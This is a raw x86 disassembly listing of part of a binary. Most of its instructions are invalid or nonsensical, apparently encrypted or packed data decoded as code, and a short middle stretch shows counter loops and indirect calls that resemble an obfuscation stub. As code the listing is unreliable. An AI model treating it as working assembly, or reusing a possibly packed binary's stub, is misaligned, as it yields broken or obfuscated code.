  40a6ec:	xor    DWORD PTR [ecx-0x36],ecx
  40a6ef:	xor    al,0xdb
  40a6f1:	daa    
  40a6f2:	add    dh,dh
  40a6f4:	mov    esi,0x225bf654
  40a6f9:	dec    ebx
  40a6fa:	fidivr DWORD PTR es:[ebp+0x5c54c1f]
  40a701:	inc    eax
  40a702:	(bad)  
  40a703:	cmp    ah,bh
  40a705:	add    edx,DWORD PTR [ecx]
  40a707:	in     eax,0xfb
  40a709:	lahf   
  40a70a:	bound  eax,QWORD PTR [ecx-0x80]
  40a70d:	js     0x40a740
  40a70f:	jmp    0x40a707
  40a711:	arpl   WORD PTR fs:[edx-0x14],cx
  40a715:	popf   
  40a716:	mov    ah,0x4
  40a718:	xchg   ebp,eax
  40a719:	es dec ebx
  40a71b:	fs in  eax,dx
  40a71d:	mov    bh,0x61
  40a71f:	mov    ds:0x1d1d21f9,al
  40a724:	retf   0x9a42
  40a727:	pop    esi
  40a728:	push   cs
  40a729:	push   ecx
  40a72a:	fiadd  WORD PTR [ebp-0x64]
  40a72d:	push   cs
  40a72e:	xchg   ebx,eax
  40a72f:	mov    BYTE PTR [edi],bl
  40a731:	xchg   DWORD PTR [ebx],ebx
  40a733:	or     edi,DWORD PTR [edi-0x2f]
  40a736:	add    eax,0x83a77bf8
  40a73b:	jmp    FWORD PTR [edx]
  40a73d:	jmp    0x2afc:0x12c1aee
  40a744:	adc    BYTE PTR [edi-0x77],al
  40a747:	inc    esi
  40a748:	nop
  40a749:	loopne 0x40a76c
  40a74b:	fstp   DWORD PTR [ebp+0x65]
  40a74e:	dec    eax
  40a74f:	aaa    
  40a750:	lea    edi,[edx+ebp*2-0x5b]
  40a754:	cmc    
  40a755:	js     0x40a7ba
  40a757:	pop    es
  40a758:	(bad)  
  40a759:	aaa    
  40a75a:	and    cl,bh
  40a75c:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40a75e:	fidivr WORD PTR [eax-0x1b91f26f]
  40a764:	in     eax,dx
  40a765:	fild   QWORD PTR [edi-0x608dd1bd]
  40a76b:	jle    0x40a75d
  40a76d:	or     ecx,edi
  40a76f:	cmp    eax,0x45240baf
  40a774:	popa   
  40a775:	cmp    eax,0x788a6108
  40a77a:	cld    
  40a77b:	jl     0x40a728
  40a77d:	mov    esi,0xd5991604
  40a782:	sbb    eax,0x3a246709
  40a787:	adc    DWORD PTR [edx],edi
  40a789:	inc    DWORD PTR [ebx+0x23]
  40a78c:	and    BYTE PTR [edx+0x6b],bl
  40a78f:	jae    0x40a7e0
  40a791:	lds    ebx,FWORD PTR [edi]
  40a793:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a794:	push   ecx
  40a795:	mov    ecx,0xcc3c866d
  40a79a:	sub    ch,bh
  40a79c:	pop    esp
  40a79d:	loope  0x40a7d2
  40a79f:	mov    ah,0xad
  40a7a1:	add    al,0xb4
  40a7a3:	sub    al,0x9a
  40a7a5:	out    0xd7,eax
  40a7a7:	xchg   ecx,eax
  40a7a8:	and    al,ah
  40a7aa:	inc    edx
  40a7ab:	(bad)  
  40a7ac:	rcl    DWORD PTR [edi],1
  40a7ae:	jmp    FWORD PTR [edx-0x1b]
  40a7b1:	mov    ebx,0x4cf1d62c
  40a7b6:	pop    es
  40a7b7:	or     BYTE PTR ds:0xcee67247,bl
  40a7bd:	cmp    esi,ecx
  40a7bf:	ja     0x40a749
  40a7c1:	repnz test al,0x7e
  40a7c4:	sbb    al,0x8f
  40a7c6:	mov    ah,0x7f
  40a7c8:	ja     0x40a82d
  40a7ca:	adc    cl,BYTE PTR [ecx+0x68]
  40a7cd:	std    
  40a7ce:	inc    BYTE PTR [ebx]
  40a7d0:	mov    bh,0x3e
  40a7d2:	add    ebp,DWORD PTR [esi]
  40a7d4:	loop   0x40a815
  40a7d6:	jmp    0x40a808
  40a7d8:	ret    0x4bb7
  40a7db:	sub    BYTE PTR ds:0xcf0fe67b,bh
  40a7e1:	cwde   
  40a7e2:	pushf  
  40a7e3:	adc    BYTE PTR [esi-0x78e2b370],bh
  40a7e9:	push   eax
  40a7ea:	mov    ecx,0x85d8c5de
  40a7ef:	ret    
  40a7f0:	push   ebp
  40a7f1:	jnp    0x40a82b
  40a7f3:	nop
  40a7f4:	sti    
  40a7f5:	sti    
  40a7f6:	mov    bh,BYTE PTR [ebp+0x61]
  40a7f9:	(bad)  
  40a7fa:	jg     0x40a7e9
  40a7fc:	sub    dh,0x5
  40a7ff:	mov    ds,WORD PTR [ecx-0x41]
  40a802:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a803:	cmc    
  40a804:	sar    DWORD PTR ds:0xc9787a25,0x62
  40a80b:	xor    DWORD PTR [edi+edx*4-0x255466c4],0xa3881d19
  40a816:	fs jmp 0x40a869
  40a819:	lods   al,BYTE PTR ds:[esi]
  40a81a:	clc    
  40a81b:	cli    
  40a81c:	adc    ch,BYTE PTR [esi-0x54]
  40a81f:	nop
  40a820:	mov    ecx,0x97a9069b
  40a825:	(bad)  
  40a826:	dec    ecx
  40a827:	cmp    esp,DWORD PTR [ebx-0x1d480221]
  40a82d:	jbe    0x40a88c
  40a82f:	mov    BYTE PTR [ecx+ebx*8],0xb7
  40a833:	mov    eax,ds:0x49c07e7e
  40a838:	mov    ebx,DWORD PTR [ecx+0x52]
  40a83b:	ja     0x40a7bf
  40a83d:	nop
  40a83e:	ret    
  40a83f:	fistp  DWORD PTR [ebp+eax*8-0x219ad193]
  40a846:	(bad)  ds:0x5d0b125
  40a84c:	push   ecx
  40a84d:	lea    eax,[ebp-0x18]
  40a850:	mov    DWORD PTR [ebp-0x24],eax
  40a853:	xor    DWORD PTR ds:0x43045d,0x5f13
  40a85d:	mov    eax,DWORD PTR [ebp-0x18]
  40a860:	and    DWORD PTR ds:0x430469,0x0
  40a86a:	jmp    0x40a87c
  40a86f:	mov    ebx,DWORD PTR ds:0x430469
  40a875:	inc    ebx
  40a876:	mov    DWORD PTR ds:0x430469,ebx
  40a87c:	cmp    DWORD PTR ds:0x430469,0x10
  40a883:	jae    0x40a8ac
  40a889:	cmp    DWORD PTR ds:0x430469,0x13
  40a890:	jne    0x40a8a1
  40a896:	push   0x42e8fb
  40a89b:	call   DWORD PTR ds:0x42ec3f
  40a8a1:	jmp    0x40a86f
  40a8a6:	and    DWORD PTR ds:0x430465,edx
  40a8ac:	mov    ecx,DWORD PTR [ebp-0x24]
  40a8af:	xor    eax,esi
  40a8b1:	add    DWORD PTR ds:0x4304eb,0x2a87
  40a8bb:	add    eax,edi
  40a8bd:	sub    ebx,DWORD PTR ds:0x43046d
  40a8c3:	mov    DWORD PTR [ecx],eax
  40a8c5:	and    DWORD PTR ds:0x42e7d4,0x0
  40a8cf:	jmp    0x40a8e1
  40a8d4:	mov    ebx,DWORD PTR ds:0x42e7d4
  40a8da:	inc    ebx
  40a8db:	mov    DWORD PTR ds:0x42e7d4,ebx
  40a8e1:	cmp    DWORD PTR ds:0x42e7d4,0x1d
  40a8e8:	jae    0x40ac77
  40a8ee:	cmp    DWORD PTR ds:0x42e7d4,0x11
  40a8f5:	jne    0x40a90b
  40a8fb:	push   0x2475
  40a900:	push   0x8142
  40a905:	call   DWORD PTR ds:0x42ea07
  40a90b:	cmp    DWORD PTR ds:0x42e7d4,0x10
  40a912:	jne    0x40a925
  40a918:	mov    ebx,DWORD PTR ds:0x42e7d4
  40a91e:	inc    ebx
  40a91f:	mov    DWORD PTR ds:0x42e7d4,ebx
  40a925:	jmp    0x40a8d4
  40a92a:	jmp    0x40ac77
  40a92f:	fsubr  QWORD PTR [esi-0x17]
  40a932:	or     eax,0x6fd88969
  40a937:	pop    eax
  40a938:	or     BYTE PTR [edx+0x702e6979],bl
  40a93e:	hlt    
  40a93f:	cdq    
  40a940:	loope  0x40a9c0
  40a942:	jle    0x40a972
  40a944:	jge    0x40a9c4
  40a946:	jle    0x40a8d4
  40a948:	pop    edi
  40a949:	push   ebp
  40a94a:	(bad)  
  40a94b:	stc    
  40a94c:	pop    esi
  40a94d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a94e:	or     eax,0x4a849474
  40a953:	xlat   BYTE PTR ds:[ebx]
  40a954:	adc    al,0xbc
  40a956:	imul   ebp,DWORD PTR ds:0xbfc955fb,0x79
  40a95d:	loope  0x40a9c0
  40a95f:	sbb    al,0xdb
  40a962:	mov    bh,BYTE PTR [ecx]
  40a964:	std    
  40a965:	dec    eax
  40a966:	cld    
  40a967:	push   ss
  40a968:	clc    
  40a969:	inc    edx
  40a96a:	push   edi
  40a96b:	cmp    BYTE PTR gs:[esi+0x5f8c5b5f],bh
  40a972:	pop    es
  40a973:	scas   al,BYTE PTR es:[edi]
  40a974:	push   edx
  40a975:	or     bl,0x49
  40a978:	add    al,0x6f
  40a97a:	xor    ebx,eax
  40a97c:	fucomi st,st(0)
  40a97e:	cwde   
  40a97f:	pop    esi
  40a980:	sbb    al,0x32
  40a982:	fldcw  WORD PTR [edx-0x58]
  40a985:	and    ah,ah
  40a987:	aad    0xb7
  40a989:	jl     0x40a914
  40a98b:	das    
  40a98c:	mov    bl,0xa9
  40a98e:	add    al,0x19
  40a990:	push   ss
  40a991:	dec    edi
  40a992:	pop    ds
  40a993:	shl    ebx,1
  40a995:	test   al,0xde
  40a997:	push   edx
  40a998:	jns    0x40a9d3
  40a99a:	cmc    
  40a99b:	enter  0xa0e5,0xdb
  40a99f:	mov    DWORD PTR [eax],esi
  40a9a1:	adc    BYTE PTR [ebx],ah
  40a9a3:	jnp    0x40aa18
  40a9a5:	ins    DWORD PTR es:[edi],dx
  40a9a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9a7:	daa    
  40a9a8:	or     DWORD PTR [esi],eax
  40a9aa:	add    BYTE PTR [esi+0x1352db3a],bh
  40a9b0:	xchg   cl,dl
  40a9b2:	dec    ecx
  40a9b3:	mov    ds:0xe4d48ddb,eax
  40a9b8:	into   
  40a9b9:	cmp    BYTE PTR [esi+0x15dc8394],al
  40a9bf:	xchg   ebx,eax
  40a9c0:	outs   dx,DWORD PTR ds:[esi]
  40a9c1:	loopne 0x40aa20
  40a9c3:	mov    ecx,0xac006b08
  40a9c8:	cwde   
  40a9c9:	in     eax,dx
  40a9ca:	clc    
  40a9cb:	inc    edi
  40a9cc:	jae    0x40a964
  40a9ce:	gs push edi
  40a9d0:	lods   eax,DWORD PTR ds:[esi]
  40a9d1:	ins    DWORD PTR es:[edi],dx
  40a9d2:	fmul   QWORD PTR [esi+0x2c1664f6]
  40a9d8:	mov    esp,0x791b5c1d
  40a9dd:	mov    esp,0x4a7c5b11
  40a9e2:	cmp    esp,DWORD PTR [esi-0x76]
  40a9e5:	sub    eax,0xa3f88505
  40a9ea:	aaa    
  40a9eb:	inc    eax
  40a9ec:	adc    bl,BYTE PTR [esi]
  40a9ee:	cmp    dl,BYTE PTR [ecx+0x441a8470]
  40a9f4:	add    ecx,DWORD PTR [esi]
  40a9f6:	inc    edx
  40a9f7:	sub    eax,0x4155555a
  40a9fc:	xchg   edi,eax
  40a9fd:	rcr    BYTE PTR [ebp-0x3c6ebc3],0x90
  40aa04:	int3   
  40aa05:	inc    eax
  40aa06:	rcr    BYTE PTR [ecx+0x55de6a60],0xc1
  40aa0d:	jle    0x40a9e0
  40aa0f:	bound  edi,QWORD PTR [esi]
  40aa11:	mov    ecx,0x5ffdd296
  40aa16:	jmp    0x2bd06fda
  40aa1b:	retf   0x1bb0
  40aa1e:	fmul   QWORD PTR [edi+0x5c485527]
  40aa24:	js     0x40aa12
  40aa26:	jbe    0x40aa06
  40aa28:	sbb    BYTE PTR [edi-0x728aadd2],bh
  40aa2e:	xlat   BYTE PTR ds:[ebx]
  40aa2f:	mov    al,0x80
  40aa31:	pop    ds
  40aa32:	and    DWORD PTR [edx],ecx
  40aa34:	xchg   edi,eax
  40aa35:	pop    edx
  40aa36:	inc    ebp
  40aa37:	push   ds
  40aa38:	mov    fs,esp
  40aa3a:	stos   BYTE PTR es:[edi],al
  40aa3b:	fidivr DWORD PTR [eax-0x48]
  40aa3e:	ret    0x9b7d
  40aa41:	popf   
  40aa42:	xlat   BYTE PTR ds:[ebx]
  40aa43:	adc    BYTE PTR [esi-0x509139ba],dh
  40aa49:	or     al,0xcf
  40aa4b:	bound  esi,QWORD PTR [eax+0x14]
  40aa4e:	push   esp
  40aa4f:	xor    BYTE PTR [ecx-0xf551de7],bh
  40aa55:	push   esi
  40aa56:	adc    ebp,edi
  40aa58:	sub    DWORD PTR [ebp+0x3242855d],0x7f2890ed
  40aa62:	dec    ebp
  40aa63:	jecxz  0x40aab3
  40aa65:	mov    al,ds:0xa4c65822
  40aa6a:	and    esp,DWORD PTR [ecx-0x69]
  40aa6d:	jno    0x40aae3
  40aa6f:	clc    
  40aa70:	mov    edx,0x96e1386b
  40aa75:	loope  0x40aa33
  40aa77:	mov    BYTE PTR [ecx],bl
  40aa79:	imul   esi,edx,0x1c
  40aa7c:	push   DWORD PTR [edi]
  40aa7e:	aad    0x7e
  40aa80:	jmp    0x40aaf7
  40aa82:	int    0x33
  40aa84:	(bad)  
  40aa85:	out    dx,eax
  40aa86:	rcl    DWORD PTR [esi-0x28f2e44f],1
  40aa8c:	call   0x1c7fa659
  40aa91:	jle    0x40aafd
  40aa93:	repnz add al,0x64
  40aa96:	stos   DWORD PTR es:[edi],eax
  40aa97:	jecxz  0x40aaa2
  40aa99:	mov    WORD PTR [ecx],ss
  40aa9b:	lock push edi
  40aa9d:	(bad)  
  40aa9f:	dec    edx
  40aaa0:	sbb    DWORD PTR [edx],ecx
  40aaa2:	aaa    
  40aaa3:	xor    BYTE PTR [esi+0x6938a11b],0x23
  40aaaa:	pop    ecx
  40aaab:	andnps xmm5,XMMWORD PTR [eax-0x281e9f02]
  40aab2:	out    dx,al
  40aab3:	mov    eax,ds:0x12e028f4
  40aab8:	mov    ecx,0xb8a01163
  40aabd:	and    eax,0xd582a5fe
  40aac2:	inc    edi
  40aac3:	inc    edx
  40aac4:	lea    esp,[ebp+esi*4-0x2c]
  40aac8:	addr16 out 0x45,al
  40aacb:	jnp    0x40aad2
  40aacd:	(bad)  
  40aace:	(bad)  
  40aacf:	movsx  ebx,dh
  40aad2:	and    esi,DWORD PTR [ebp-0x4ccd73c3]
  40aad8:	popa   
  40aad9:	mov    ch,0x97
  40aadb:	out    dx,al
  40aadc:	scas   eax,DWORD PTR es:[edi]
  40aadd:	test   eax,0xaefee6b7
  40aae2:	and    al,0xb6
  40aae4:	lock sbb dh,al
  40aae7:	test   al,0x2e
  40aae9:	push   ds
  40aaea:	pop    ebx
  40aaeb:	enter  0x2c22,0xac
  40aaef:	shr    DWORD PTR [edi],1
  40aaf1:	dec    edx
  40aaf2:	sub    al,0x2a
  40aaf4:	cs pop ebx
  40aaf6:	fistp  QWORD PTR gs:0x9ea4c36a
  40aafd:	js     0x40aa9e
  40aaff:	mov    ebx,eax
  40ab01:	mov    esp,0x80787322
  40ab06:	xor    ebp,ebp
  40ab08:	or     al,0xf0
  40ab0a:	into   
  40ab0b:	push   eax
  40ab0c:	lods   al,BYTE PTR ds:[esi]
  40ab0d:	xor    ah,ch
  40ab0f:	inc    esp
  40ab10:	mov    dh,0x5a
  40ab12:	mov    bl,0xf0
  40ab14:	push   esi
  40ab15:	dec    ecx
  40ab16:	test   BYTE PTR [esi-0x2f],bh
  40ab19:	pusha  
  40ab1a:	lahf   
  40ab1b:	ror    BYTE PTR [ebp-0x7c0c9bd8],0x80
  40ab22:	lds    edx,FWORD PTR [esi-0x3c]
  40ab25:	push   es
  40ab26:	aam    0x88
  40ab28:	and    BYTE PTR [eax-0x3],al
  40ab2b:	loop   0x40ab93
  40ab2d:	mov    esp,0x1ea1a97
  40ab32:	xor    BYTE PTR [ebp+eiz*8+0x73],dl
  40ab36:	inc    esi
  40ab37:	mov    eax,0xf433daec
  40ab3c:	push   esi
  40ab3d:	sbb    al,0x26
  40ab3f:	push   edx
  40ab40:	enter  0x2d54,0xd2
  40ab44:	pop    ecx
  40ab45:	mov    dh,0xdd
  40ab47:	xor    eax,0xa38cdc24
  40ab4c:	(bad)  [ebx-0x25]
  40ab4f:	mov    eax,ds:0x31780a2c
  40ab54:	jmp    0x5525218e
  40ab59:	cmc    
  40ab5a:	cmp    dl,ah
  40ab5c:	mov    ?,ecx
  40ab5e:	mov    edx,0xbbf7f179
  40ab63:	push   ss
  40ab64:	pop    ebx
  40ab65:	ret    
  40ab66:	imul   edx,DWORD PTR [esi+0x19],0x23d28524
  40ab6d:	dec    ebx
  40ab6e:	dec    ebp
  40ab6f:	pop    ecx
  40ab70:	fcomp  DWORD PTR ds:0xc4c48734
  40ab76:	dec    ebp
  40ab77:	retf   
  40ab78:	xor    DWORD PTR [esi+0x5a6d3f63],ebp
  40ab7e:	jmp    0xee8df28
  40ab83:	ins    BYTE PTR es:[edi],dx
  40ab84:	test   al,0x75
  40ab86:	mov    bh,0xcb
  40ab88:	cmp    al,0x9b
  40ab8a:	sar    DWORD PTR [esi+0x5eb45926],1
  40ab90:	push   0x3e
  40ab92:	je     0x40ab7e
  40ab94:	cwde   
  40ab95:	int    0x7b
  40ab97:	sar    esi,cl
  40ab99:	and    BYTE PTR [edx],ch
  40ab9b:	mov    eax,ds:0x601b6666
  40aba0:	lods   eax,DWORD PTR ds:[esi]
  40aba1:	rol    DWORD PTR [edx-0x577ac85b],0xd1
  40aba8:	push   cs
  40aba9:	push   ds
  40abaa:	adc    eax,edi
  40abac:	adc    bh,dl
  40abae:	push   ss
  40abaf:	stc    
  40abb0:	ja     0x40abf3
  40abb2:	dec    esi
  40abb3:	push   ss
  40abb4:	pop    esi
  40abb5:	xor    esi,DWORD PTR [ebp-0x61873f7]
  40abbb:	add    al,0x84
  40abbd:	jmp    0x3c19:0x763625a2
  40abc4:	popf   
  40abc5:	inc    esp
  40abc6:	ror    BYTE PTR [eax],0xc1
  40abc9:	and    eax,0xda3f9f1c
  40abce:	and    BYTE PTR [ebx-0x5d],dl
  40abd1:	dec    edx
  40abd2:	shl    DWORD PTR [esi-0x124a64df],cl
  40abd8:	std    
  40abd9:	sbb    BYTE PTR [eax+0x5ff8a1da],ah
  40abdf:	pop    ecx
  40abe0:	(bad)  
  40abe1:	pop    ecx
  40abe2:	xchg   DWORD PTR [esi+eax*1],esi
  40abe5:	test   BYTE PTR [ebx],dh
  40abe7:	fnsave [edx+0x7228c919]
  40abed:	pop    esi
  40abee:	dec    edx
  40abef:	jmp    0x40ac55
  40abf1:	pop    es
  40abf2:	fist   DWORD PTR gs:[ecx+0x10f5ee22]
  40abf9:	repz pop ecx
  40abfb:	jo     0x40ac64
  40abfd:	add    BYTE PTR [ecx],bh
  40abff:	mov    ecx,DWORD PTR [esi-0x55e27ad1]
  40ac05:	out    0x81,al
  40ac07:	cmp    al,0xea
  40ac09:	push   cs
  40ac0a:	test   BYTE PTR [ecx+ebp*1],dl
  40ac0d:	shr    DWORD PTR [eax],1
  40ac0f:	outs   dx,DWORD PTR ds:[esi]
  40ac10:	mov    BYTE PTR [esi+eiz*1],bl
  40ac13:	jne    0x40ac2e
  40ac15:	sub    DWORD PTR [ebp-0x1c],ebp
  40ac18:	(bad)  
  40ac19:	jo     0x40ac18
  40ac1b:	xor    DWORD PTR [edi+0x3ab00cad],edi
  40ac21:	inc    ebp
  40ac22:	ret    0xd4bc
  40ac25:	loopne 0x40aca4
  40ac27:	js     0x40aca6
  40ac29:	dec    edi
  40ac2a:	mov    ds:0x22fe9fde,al
  40ac2f:	sbb    dl,cl
  40ac31:	mov    dh,0x6c
  40ac33:	adc    BYTE PTR [edx+ebx*8+0x571cc83e],al
  40ac3a:	xchg   ebp,eax
  40ac3b:	inc    edx
  40ac3c:	push   edx
  40ac3d:	frstor [esi-0x56cf6587]
  40ac43:	xchg   esi,eax
  40ac44:	cmp    BYTE PTR [edx+0x65],dh
  40ac47:	test   al,0xe7
  40ac49:	js     0x40ac8f
  40ac4b:	jae    0x40ac00
  40ac4d:	in     eax,0xe3
  40ac4f:	addr16 imul ebx,edi,0xdc99ab19
  40ac56:	adc    bh,dh
  40ac58:	mov    esi,0x547dc213
  40ac5d:	dec    esp
  40ac5e:	rol    BYTE PTR [ebp+0x43],cl
  40ac61:	(bad)  
  40ac63:	cwde   
  40ac64:	fisttp DWORD PTR cs:[edi]
  40ac67:	hlt    
  40ac68:	out    dx,eax
  40ac69:	inc    edx
  40ac6a:	arpl   WORD PTR [ecx],sp
  40ac6c:	jle    0x40ac89
  40ac6e:	sub    BYTE PTR [esi],ch
  40ac70:	jmp    0x40acc5
  40ac72:	sbb    dl,BYTE PTR [ebx-0x7a]
  40ac75:	popa   
  40ac76:	into   
  40ac77:	mov    eax,ds:0x41227c
  40ac7c:	mov    ebx,0x8e12feb8
  40ac81:	jmp    0x40afce
  40ac86:	leave  
  40ac87:	inc    edx
  40ac88:	mov    ebp,0xd1515553
  40ac8d:	inc    eax
  40ac8e:	xor    ch,ah
  40ac90:	icebp  
  40ac91:	pushf  
  40ac92:	and    edi,DWORD PTR [edx-0x70]
  40ac95:	and    DWORD PTR [ecx-0x14],ecx
  40ac98:	jle    0x40ad18
  40ac9a:	cs jge 0x40ad1b
  40ac9d:	jle    0x40ac70
  40ac9f:	jno    0x40ac95
  40aca1:	shl    dh,0x7a
  40aca4:	dec    ecx
  40aca5:	or     eax,DWORD PTR [esi-0x117d14d2]
  40acab:	mov    dh,0x67
  40acad:	pop    esp
  40acae:	xchg   ecx,eax
  40acaf:	and    ecx,DWORD PTR [esi+0x40fcb8ab]
  40acb5:	dec    edx
  40acb6:	fst    QWORD PTR [ecx]
  40acb8:	adc    edi,DWORD PTR [ebp-0x5d]
  40acbb:	in     eax,dx
  40acbc:	pop    esp
  40acbd:	push   ds
  40acbe:	dec    edx
  40acbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40acc0:	mov    edi,0x8e60d27e
  40acc5:	lods   al,BYTE PTR ds:[esi]
  40acc6:	or     BYTE PTR ds:0x8b6bffc7,0x63
  40accd:	mov    ah,bh
  40accf:	jo     0x40aca2
  40acd1:	stc    
  40acd2:	retf   
  40acd3:	adc    DWORD PTR [eax+esi*4],esi
  40acd6:	in     al,0x6e
  40acd8:	xor    BYTE PTR [edx+eiz*4-0x6d1677fb],ah
  40acdf:	xchg   edi,eax
  40ace0:	xor    cl,BYTE PTR [eax+0x38]
  40ace3:	jg     0x40ad4e
  40ace5:	inc    ebp
  40ace6:	mov    ch,0x80
  40ace8:	mov    eax,ds:0xe5caa2f6
  40aced:	(bad)  
  40acee:	retf   
  40acef:	sub    ch,dh
  40acf1:	lock out dx,eax
  40acf3:	inc    esp
  40acf4:	adc    eax,0x8c646c41
  40acf9:	mov    al,0x9f
  40acfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40acfc:	mov    bh,0xd5
  40acfe:	jp     0x40ad76
  40ad00:	fmul   DWORD PTR [ebx]
  40ad02:	jecxz  0x40ac98
  40ad04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad05:	mov    eax,0xe2925878
  40ad0a:	sub    al,0xf5
  40ad0c:	pop    edi
  40ad0d:	mov    ds:0xbf7b66f2,eax
  40ad12:	fistp  DWORD PTR [ebx]
  40ad14:	jns    0x40ad72
  40ad16:	ins    DWORD PTR es:[edi],dx
  40ad17:	ror    ah,cl
  40ad19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad1a:	pusha  
  40ad1b:	cs dec esi
  40ad1d:	leave  
  40ad1e:	and    BYTE PTR [eax],ah
  40ad20:	cs xor esi,ebx
  40ad23:	add    al,BYTE PTR [edx-0x54b7bbaa]
  40ad29:	xchg   ebp,eax
  40ad2a:	test   DWORD PTR [edi+0x7f],eax
  40ad2d:	(bad)  
  40ad2e:	fldcw  WORD PTR [esi+0xd3d8760]
  40ad34:	mul    BYTE PTR [ebp-0x4a1756a9]
  40ad3a:	les    ecx,FWORD PTR [edx]
  40ad3c:	mov    dl,0xea
  40ad3e:	mov    ch,0xae
  40ad40:	sub    BYTE PTR [eax-0x3ec1bd2e],ch
  40ad46:	nop
  40ad47:	xor    esp,DWORD PTR [ebx+0x75]
  40ad4a:	push   ss
  40ad4b:	fst    QWORD PTR [ebp-0x15]
  40ad4e:	sub    al,0xf1
  40ad50:	adc    eax,0xd61ec0c6
  40ad55:	add    al,0x96
  40ad57:	sbb    eax,0x4edc9216
  40ad5c:	push   ebx
  40ad5d:	aas    
  40ad5e:	adc    al,0x92
  40ad60:	xchg   edx,eax
  40ad61:	xchg   esp,eax
  40ad62:	(bad)  
  40ad63:	and    BYTE PTR [eax+0x10],bh
  40ad66:	int3   
  40ad67:	scas   eax,DWORD PTR es:[edi]
  40ad68:	es stc 
  40ad6a:	mov    ch,0x8e
  40ad6c:	fnstenv [edx+0xb7607cd]
  40ad72:	pushf  
  40ad73:	jnp    0x40adaf
  40ad75:	cli    
  40ad76:	in     eax,dx
  40ad77:	mov    ah,0x60
  40ad79:	inc    ecx
  40ad7a:	scas   eax,DWORD PTR es:[edi]
  40ad7b:	push   ecx
  40ad7c:	add    DWORD PTR [eax],eax
  40ad7e:	push   ebx
  40ad7f:	mul    esi
  40ad81:	sbb    bl,BYTE PTR [ecx+0x4d86c63c]
  40ad87:	mov    esp,?
  40ad89:	fcom   QWORD PTR [esi]
  40ad8b:	stos   DWORD PTR es:[edi],eax
  40ad8c:	pop    edx
  40ad8d:	jns    0x40ad79
  40ad8f:	aas    
  40ad90:	mov    al,ds:0x4abe713c
  40ad95:	mov    bh,0x61
  40ad97:	cdq    
  40ad98:	retf   0xd571
  40ad9b:	mov    DWORD PTR [ebx+0x18f0320a],edi
  40ada1:	inc    esp
  40ada2:	mov    dl,0x91
  40ada4:	sbb    DWORD PTR [eax],edx
  40ada6:	xor    BYTE PTR [ecx+edx*8],0xf2
  40adaa:	push   edx
  40adab:	neg    BYTE PTR [esi+0x15]
  40adae:	call   0x6e56c941
  40adb3:	daa    
  40adb4:	push   0x968bb003
  40adb9:	test   BYTE PTR [eax-0x30],bl
  40adbc:	dec    esi
  40adbd:	(bad)  
  40adbe:	mov    ebx,0x3118c12f
  40adc3:	(bad)  
  40adc4:	(bad)  
  40adc5:	int    0x98
  40adc7:	cmp    ebx,ebx
  40adc9:	jnp    0x40ad7c
  40adcb:	push   esp
  40adcc:	lods   al,BYTE PTR ds:[esi]
  40adcd:	aas    
  40adce:	mov    bh,BYTE PTR [edx-0x3d05b186]
  40add4:	int3   
  40add5:	(bad)  
  40add6:	jmp    0x44412170
  40addb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40addc:	and    eax,DWORD PTR [ebp-0x3e2581bc]
  40ade2:	or     edx,ebp
  40ade4:	and    ecx,DWORD PTR [ecx]
  40ade6:	mov    ebx,DWORD PTR [ecx]
  40ade8:	xor    al,0xb5
  40adea:	sbb    dh,dh
  40adec:	std    
  40aded:	dec    esi
  40adee:	cmp    ch,BYTE PTR [ebp+0x16]
  40adf1:	add    BYTE PTR [esi+0x35],bh
  40adf4:	mov    DWORD PTR [edx+0xe],ebx
  40adf7:	inc    ebx
  40adf8:	test   al,0x0
  40adfa:	mov    ebp,0xee05a51f
  40adff:	cwde   
  40ae00:	fidivr DWORD PTR [ecx-0x4a]
  40ae03:	or     al,0x60
  40ae05:	jbe    0x40ae4c
  40ae07:	hlt    
  40ae08:	inc    esi
  40ae09:	enter  0xec93,0x88
  40ae0d:	fidivr DWORD PTR [edi]
  40ae0f:	shr    DWORD PTR [ecx],0xf9
  40ae12:	add    BYTE PTR [ebx+0x58],0x36
  40ae16:	mov    esp,0x72eaa917
  40ae1b:	inc    esi
  40ae1c:	lds    ebp,FWORD PTR [ecx]
  40ae1e:	inc    edx
  40ae1f:	xor    bl,al
  40ae21:	mul    DWORD PTR [ebx]
  40ae23:	bound  ebx,QWORD PTR [ebx-0x2673f22]
  40ae29:	mov    bl,0xfd
  40ae2b:	test   BYTE PTR [edx-0x4f0ce5aa],ch
  40ae31:	cmp    eax,0xd9fe99c2
  40ae36:	(bad)  
  40ae38:	mov    esp,?
  40ae3a:	ret    0x7385
  40ae3d:	push   ebx
  40ae3e:	xor    eax,0x80135e47
  40ae43:	in     eax,0x4f
  40ae45:	leave  
  40ae46:	in     eax,dx
  40ae47:	fprem  
  40ae49:	add    cl,BYTE PTR [ecx+0x623dedae]
  40ae4f:	push   0xfffffff5
  40ae51:	sub    BYTE PTR [edi-0x3a],ah
  40ae54:	dec    esi
  40ae55:	cwde   
  40ae56:	push   ecx
  40ae57:	or     eax,DWORD PTR [eax-0x63]
  40ae5a:	clc    
  40ae5b:	fwait
  40ae5c:	mov    es,WORD PTR [edx-0x7a86dd8a]
  40ae62:	lds    ecx,FWORD PTR [edi]
  40ae64:	push   0x70
  40ae66:	jbe    0x40ae29
  40ae68:	jbe    0x40ae20
  40ae6a:	mov    cl,0x36
  40ae6c:	cmp    cl,BYTE PTR [ecx+0x74]
  40ae6f:	cmp    ebx,DWORD PTR [eax-0x5332cc21]
  40ae75:	out    0x66,eax
  40ae77:	dec    esp
  40ae78:	inc    ebx
  40ae79:	lods   al,BYTE PTR ds:[esi]
  40ae7a:	or     esi,ebx
  40ae7c:	(bad)  
  40ae7d:	bound  edi,QWORD PTR [edi-0x50]
  40ae80:	jle    0x40ae3e
  40ae82:	add    eax,0xe56212bf
  40ae87:	test   BYTE PTR [eax+0x3f1f9f4c],dl
  40ae8d:	push   ecx
  40ae8e:	sbb    esp,DWORD PTR [esi+0x2c]
  40ae91:	jns    0x40ae7b
  40ae93:	ror    BYTE PTR [eax-0x3947eb6d],1
